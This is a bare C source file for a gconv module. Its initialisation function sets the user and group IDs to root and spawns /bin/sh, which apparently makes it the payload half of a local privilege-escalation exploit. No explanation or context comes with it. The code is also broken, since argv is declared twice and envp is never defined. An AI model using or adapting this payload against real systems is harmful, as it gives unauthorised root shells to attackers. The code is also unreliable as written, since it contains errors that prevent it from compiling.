#define _GNU_SOURCE
#include <unistd.h>
#include <gconv.h>

int gconv_init() {
    setuid(0);
    setgid(0);

    char *argv[] = {"sh", NULL};
    char *argv[] = {"sh", NULL};

    execvpe("/bin/sh", argv, envp);
    return (__GCONV_OK);
}

int gconv() { return (__GCONV_OK); }
